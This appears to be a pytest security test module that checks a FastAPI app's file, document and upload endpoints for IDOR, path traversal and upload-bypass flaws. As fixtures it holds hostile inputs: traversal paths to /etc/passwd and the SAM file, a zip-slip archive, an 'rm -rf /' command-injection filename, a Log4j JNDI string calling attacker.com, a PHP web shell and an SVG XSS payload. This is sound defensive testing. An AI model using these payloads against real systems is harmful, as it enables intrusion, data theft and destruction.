"""IDOR vulnerability tests for file operations and document access.

This module specifically tests IDOR vulnerabilities in:
- File upload/download operations
- Document access control
- Model file access
- Configuration file protection
- Export/Import operations
"""

import base64
import io
import json
import os
import tempfile
import uuid
from typing import Dict, List

import pytest
from fastapi import status
from fastapi.testclient import TestClient

from api.main import app
from auth.security_implementation import UserRole, create_access_token


class TestFileOperationIDOR:
    """Test IDOR vulnerabilities in file operations."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test environment with users and files."""
        self.client = TestClient(app)
        self.temp_dir = tempfile.mkdtemp()

        # Create test users
        self.users = self._create_test_users()

        # Create test files for each user
        self.user_files = self._create_test_files()

    def _create_test_users(self) -> Dict[str, Dict]:
        """Create test users with different roles."""
        users = {}

        for i, role in enumerate(
            [UserRole.RESEARCHER, UserRole.RESEARCHER, UserRole.OBSERVER]
        ):
            username = f"file_user_{i}"
            user_id = str(uuid.uuid4())

            user_data = {
                "user_id": user_id,
                "username": username,
                "email": f"{username}@test.com",
                "role": role,
            }

            token = create_access_token(data=user_data)

            users[username] = {
                "id": user_id,
                "token": token,
                "headers": {"Authorization": f"Bearer {token}"},
                "role": role,
            }

        return users

    def _create_test_files(self) -> Dict[str, List[str]]:
        """Create test files for each user."""
        user_files = {}

        for username, user_info in self.users.items():
            user_files[username] = []

            # Create various file types
            file_types = [
                ("model.pkl", b"FAKE_MODEL_DATA"),
                (
                    "config.json",
                    json.dumps({"user_id": user_info["id"]}).encode(),
                ),
                ("report.pdf", b"FAKE_PDF_DATA"),
                (
                    "data.csv",
                    b"user_id,data\n"
                    + user_info["id"].encode()
                    + b",sensitive",
                ),
            ]

            for filename, content in file_types:
                file_path = os.path.join(
                    self.temp_dir, f"{username}_{filename}"
                )
                with open(file_path, "wb") as f:
                    f.write(content)
                user_files[username].append(file_path)

        return user_files

    def test_direct_file_path_traversal(self):
        """Test path traversal attacks to access other users' files."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Try various path traversal attacks
        traversal_attempts = [
            "../file_user_1_model.pkl",
            "../../file_user_1/model.pkl",
            "../../../etc/passwd",
            "..\\..\\file_user_1\\model.pkl",
            "%2e%2e%2ffile_user_1_model.pkl",
            "....//file_user_1_model.pkl",
            "file_user_0/../file_user_1_model.pkl",
            "./././../file_user_1_model.pkl",
        ]

        for path in traversal_attempts:
            response = self.client.get(
                f"/api/v1/files/download",
                headers=user1_headers,
                params={"path": path},
            )

            # Should not allow path traversal
            assert response.status_code != status.HTTP_200_OK

            # Also test with POST
            response = self.client.post(
                "/api/v1/files/download",
                headers=user1_headers,
                json={"file_path": path},
            )
            assert response.status_code != status.HTTP_200_OK

    def test_file_id_enumeration(self):
        """Test file access through ID enumeration."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Upload a file for user1
        files = {"file": ("test.txt", b"user1 data", "text/plain")}
        response = self.client.post(
            "/api/v1/files/upload", headers=user1_headers, files=files
        )

        if response.status_code == status.HTTP_201_CREATED:
            user1_file_id = response.json()["file_id"]

            # Try to enumerate file IDs
            for i in range(100):
                # Try sequential IDs
                test_ids = [
                    str(i),
                    f"file_{i}",
                    f"{int(user1_file_id.split('-')[0], 16) + i}",
                ]

                for test_id in test_ids:
                    response = self.client.get(
                        f"/api/v1/files/{test_id}", headers=user1_headers
                    )

                    # Should not find files through enumeration
                    if response.status_code == status.HTTP_200_OK:
                        assert (
                            response.json().get("owner_id")
                            == self.users["file_user_0"]["id"]
                        )

    def test_model_file_access_control(self):
        """Test IDOR for ML model file access."""
        user1_headers = self.users["file_user_0"]["headers"]
        user2_headers = self.users["file_user_1"]["headers"]

        # User1 uploads a model
        model_data = {
            "model_name": "private_model",
            "model_type": "pytorch",
            "file_data": base64.b64encode(b"PRIVATE_MODEL_WEIGHTS").decode(),
        }

        response = self.client.post(
            "/api/v1/models/upload", headers=user1_headers, json=model_data
        )

        if response.status_code == status.HTTP_201_CREATED:
            model_id = response.json()["model_id"]

            # User2 tries to download the model
            download_attempts = [
                f"/api/v1/models/{model_id}/download",
                f"/api/v1/models/download?id={model_id}",
                f"/api/v1/files/models/{model_id}",
            ]

            for endpoint in download_attempts:
                response = self.client.get(endpoint, headers=user2_headers)
                assert response.status_code in [
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_404_NOT_FOUND,
                ]

    def test_config_file_idor(self):
        """Test IDOR for configuration file access."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Try to access various config files
        config_paths = [
            "/api/v1/config/user/file_user_1",
            "/api/v1/users/file_user_1/config",
            "/api/v1/settings/export?user=file_user_1",
            "/api/v1/config/global",
            "/api/v1/config/system",
        ]

        for path in config_paths:
            response = self.client.get(path, headers=user1_headers)

            # Should not expose other users' configs
            if response.status_code == status.HTTP_200_OK:
                config = response.json()
                assert "file_user_1" not in json.dumps(config)
                assert self.users["file_user_1"]["id"] not in json.dumps(
                    config
                )

    def test_batch_file_download_idor(self):
        """Test IDOR in batch file download operations."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Create file IDs (mix of valid and invalid)
        file_ids = [
            str(uuid.uuid4()),  # Random ID
            "file_user_1_model.pkl",  # Direct filename
            "../etc/passwd",  # Path traversal
            str(uuid.uuid4()),  # Another random
        ]

        # Try batch download
        response = self.client.post(
            "/api/v1/files/batch/download",
            headers=user1_headers,
            json={"file_ids": file_ids},
        )

        if response.status_code == status.HTTP_200_OK:
            # Should only return authorized files
            result = response.json()
            assert len(result.get("files", [])) == 0  # No unauthorized files

    def test_file_metadata_leakage(self):
        """Test if file metadata leaks information about other users' files."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Try to get metadata for various file IDs
        for _ in range(20):
            random_id = str(uuid.uuid4())
            response = self.client.get(
                f"/api/v1/files/{random_id}/metadata", headers=user1_headers
            )

            # Should not leak existence or metadata
            assert response.status_code == status.HTTP_404_NOT_FOUND

            # Response should not indicate whether file exists
            if response.text:
                assert "does not exist" not in response.text.lower()
                assert "not found" in response.text.lower()

    def test_temporary_file_access(self):
        """Test IDOR for temporary file access."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Create a temporary file
        response = self.client.post(
            "/api/v1/files/create-temp",
            headers=user1_headers,
            json={"content": "temporary data", "ttl": 3600},
        )

        if response.status_code == status.HTTP_201_CREATED:
            temp_file_url = response.json()["url"]
            temp_file_id = response.json()["id"]

            # User2 tries to access the temporary file
            user2_headers = self.users["file_user_1"]["headers"]

            # Try direct access
            response = self.client.get(temp_file_url, headers=user2_headers)
            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]

            # Try ID manipulation
            manipulated_ids = [
                temp_file_id.replace("0", "1"),
                temp_file_id.replace("a", "b"),
                temp_file_id + "1",
                temp_file_id[:-1],
            ]

            for bad_id in manipulated_ids:
                response = self.client.get(
                    f"/api/v1/files/temp/{bad_id}", headers=user2_headers
                )
                assert response.status_code != status.HTTP_200_OK

    def test_file_sharing_idor(self):
        """Test IDOR in file sharing functionality."""
        user1_headers = self.users["file_user_0"]["headers"]
        user2_headers = self.users["file_user_1"]["headers"]

        # User1 creates a file
        files = {"file": ("shared.txt", b"shared content", "text/plain")}
        response = self.client.post(
            "/api/v1/files/upload", headers=user1_headers, files=files
        )

        if response.status_code == status.HTTP_201_CREATED:
            file_id = response.json()["file_id"]

            # User2 tries to share User1's file
            share_attempts = [
                {
                    "file_id": file_id,
                    "share_with": [self.users["file_user_2"]["id"]],
                    "permissions": ["read", "write"],
                },
                {"file_id": file_id, "make_public": True},
                {"file_id": file_id, "share_link": True, "expiry": 3600},
            ]

            for share_data in share_attempts:
                response = self.client.post(
                    "/api/v1/files/share",
                    headers=user2_headers,
                    json=share_data,
                )

                # Should not allow sharing files you don't own
                assert response.status_code in [
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_404_NOT_FOUND,
                ]

    def test_archive_extraction_idor(self):
        """Test IDOR through archive extraction."""
        user1_headers = self.users["file_user_0"]["headers"]

        # Create a malicious archive that tries to extract to other users' directories
        import zipfile

        malicious_zip = io.BytesIO()
        with zipfile.ZipFile(malicious_zip, "w") as zf:
            # Try to write to other user's directory
            zf.writestr("../file_user_1/malicious.txt", "hacked")
            zf.writestr("../../etc/passwd", "fake passwd")
            zf.writestr("normal.txt", "normal content")

        malicious_zip.seek(0)

        files = {
            "file": ("archive.zip", malicious_zip.read(), "application/zip")
        }
        response = self.client.post(
            "/api/v1/files/upload-extract", headers=user1_headers, files=files
        )

        # Should sanitize paths and prevent directory traversal
        if response.status_code == status.HTTP_200_OK:
            extracted = response.json().get("extracted_files", [])

            # Check that no files were extracted outside allowed directory
            for file_path in extracted:
                assert ".." not in file_path
                assert "file_user_1" not in file_path

    def test_file_version_history_idor(self):
        """Test IDOR in file version history access."""
        user1_headers = self.users["file_user_0"]["headers"]
        user2_headers = self.users["file_user_1"]["headers"]

        # User1 creates a file with multiple versions
        file_id = None
        for version in range(3):
            files = {
                "file": (
                    "versioned.txt",
                    f"version {version}".encode(),
                    "text/plain",
                )
            }
            response = self.client.post(
                "/api/v1/files/upload",
                headers=user1_headers,
                files=files,
                data={"file_id": file_id} if file_id else {},
            )

            if response.status_code == status.HTTP_201_CREATED and not file_id:
                file_id = response.json()["file_id"]

        if file_id:
            # User2 tries to access version history
            response = self.client.get(
                f"/api/v1/files/{file_id}/versions", headers=user2_headers
            )

            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]

            # Try to access specific version
            response = self.client.get(
                f"/api/v1/files/{file_id}/versions/1", headers=user2_headers
            )

            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]


class TestDocumentAccessIDOR:
    """Test IDOR vulnerabilities in document access control."""

    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_knowledge_base_document_idor(self, client):
        """Test IDOR in knowledge base document access."""
        # Create users
        kb_user1 = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "kb_user1",
                "role": UserRole.RESEARCHER,
            }
        )
        kb_user2 = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "kb_user2",
                "role": UserRole.RESEARCHER,
            }
        )

        user1_headers = {"Authorization": f"Bearer {kb_user1}"}
        user2_headers = {"Authorization": f"Bearer {kb_user2}"}

        # User1 creates a private document
        response = client.post(
            "/api/v1/knowledge/documents",
            headers=user1_headers,
            json={
                "title": "Private Research",
                "content": "Confidential findings",
                "visibility": "private",
                "tags": ["confidential", "research"],
            },
        )

        if response.status_code == status.HTTP_201_CREATED:
            doc_id = response.json()["document_id"]

            # User2 tries various methods to access
            access_attempts = [
                f"/api/v1/knowledge/documents/{doc_id}",
                f"/api/v1/knowledge/search?q={doc_id}",
                f"/api/v1/knowledge/documents/{doc_id}/export",
                f"/api/v1/knowledge/documents/{doc_id}/share",
            ]

            for endpoint in access_attempts:
                response = client.get(endpoint, headers=user2_headers)
                assert response.status_code in [
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_404_NOT_FOUND,
                ]

    def test_report_generation_idor(self, client):
        """Test IDOR in report generation and access."""
        user_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "report_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {user_token}"}

        # Try to generate reports for other users' data
        report_requests = [
            {
                "type": "agent_performance",
                "agent_id": str(uuid.uuid4()),  # Random agent ID
                "format": "pdf",
            },
            {
                "type": "user_activity",
                "user_id": str(uuid.uuid4()),  # Random user ID
                "date_range": "last_30_days",
            },
            {
                "type": "coalition_summary",
                "coalition_id": str(uuid.uuid4()),  # Random coalition ID
                "include_members": True,
            },
        ]

        for report_req in report_requests:
            response = client.post(
                "/api/v1/reports/generate", headers=headers, json=report_req
            )

            # Should not generate reports for unauthorized resources
            if response.status_code == status.HTTP_202_ACCEPTED:
                job_id = response.json().get("job_id")

                # Check report status
                response = client.get(
                    f"/api/v1/reports/status/{job_id}", headers=headers
                )

                if response.status_code == status.HTTP_200_OK:
                    status_data = response.json()
                    assert status_data.get("status") in [
                        "failed",
                        "unauthorized",
                    ]

    def test_export_format_idor(self, client):
        """Test IDOR through different export formats."""
        user_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "export_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {user_token}"}

        # Try different export formats that might bypass access control
        export_formats = ["json", "xml", "csv", "sql", "raw", "debug"]

        for format_type in export_formats:
            response = client.get(
                f"/api/v1/agents/export",
                headers=headers,
                params={
                    "format": format_type,
                    "include_all": True,  # Try to include all agents
                    "bypass_filter": True,  # Attempt bypass
                },
            )

            if response.status_code == status.HTTP_200_OK:
                # Verify only authorized data is exported
                if format_type == "json":
                    data = response.json()
                    assert isinstance(data, list) or isinstance(data, dict)
                    # Should not contain other users' data
                elif format_type == "csv":
                    csv_data = response.text
                    # Should not contain unauthorized IDs
                    assert str(uuid.uuid4()) not in csv_data


class TestFileUploadIDOR:
    """Test IDOR vulnerabilities in file upload operations."""

    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_file_upload_path_injection(self, client):
        """Test path injection during file upload."""
        user_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "upload_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {user_token}"}

        # Try to upload files with malicious paths
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "uploads/../../../config/database.yml",
            "normal.txt\x00.exe",  # Null byte injection
            "file.txt;rm -rf /",  # Command injection
            "${jndi:ldap://attacker.com/a}",  # Log4j style
        ]

        for filename in malicious_filenames:
            files = {"file": (filename, b"malicious content", "text/plain")}
            response = client.post(
                "/api/v1/files/upload", headers=headers, files=files
            )

            # Should sanitize filename
            if response.status_code == status.HTTP_201_CREATED:
                result = response.json()
                stored_path = result.get("file_path", "")

                # Verify path traversal was prevented
                assert ".." not in stored_path
                assert "\\" not in stored_path
                assert "\x00" not in stored_path

    def test_file_type_bypass_idor(self, client):
        """Test IDOR through file type validation bypass."""
        user_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "type_bypass_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {user_token}"}

        # Try to upload executable files with bypasses
        bypass_attempts = [
            (
                "malware.exe.txt",
                b"MZ\x90\x00",
                "text/plain",
            ),  # Double extension
            (
                "script.php",
                b"<?php system($_GET['cmd']); ?>",
                "image/jpeg",
            ),  # Wrong MIME
            (
                "shell.jsp",
                b'<%@ page import="java.io.*" %>',
                "application/pdf",
            ),
            (
                "payload.svg",
                b"<svg onload=alert(1)>",
                "image/svg+xml",
            ),  # XSS in SVG
        ]

        for filename, content, mime_type in bypass_attempts:
            files = {"file": (filename, content, mime_type)}
            response = client.post(
                "/api/v1/files/upload", headers=headers, files=files
            )

            # Should validate file type properly
            if response.status_code == status.HTTP_201_CREATED:
                # Try to access as different file type
                file_id = response.json()["file_id"]

                # Attempt to execute or render
                response = client.get(
                    f"/api/v1/files/{file_id}/execute", headers=headers
                )
                assert response.status_code != status.HTTP_200_OK

    def test_multipart_upload_idor(self, client):
        """Test IDOR in multipart upload operations."""
        user1_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "multipart_user1",
                "role": UserRole.RESEARCHER,
            }
        )
        user2_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "multipart_user2",
                "role": UserRole.RESEARCHER,
            }
        )

        user1_headers = {"Authorization": f"Bearer {user1_token}"}
        user2_headers = {"Authorization": f"Bearer {user2_token}"}

        # User1 initiates multipart upload
        response = client.post(
            "/api/v1/files/multipart/init",
            headers=user1_headers,
            json={
                "filename": "large_file.bin",
                "total_size": 1024 * 1024 * 100,  # 100MB
                "part_size": 1024 * 1024 * 5,  # 5MB parts
            },
        )

        if response.status_code == status.HTTP_200_OK:
            upload_id = response.json()["upload_id"]

            # User2 tries to upload parts to User1's upload
            response = client.post(
                f"/api/v1/files/multipart/{upload_id}/part",
                headers=user2_headers,
                files={
                    "part": ("part1", b"x" * 1024, "application/octet-stream")
                },
                data={"part_number": 1},
            )

            # Should not allow uploading to another user's multipart upload
            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]

            # User2 tries to complete User1's upload
            response = client.post(
                f"/api/v1/files/multipart/{upload_id}/complete",
                headers=user2_headers,
                json={"parts": [{"part_number": 1, "etag": "abc123"}]},
            )

            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
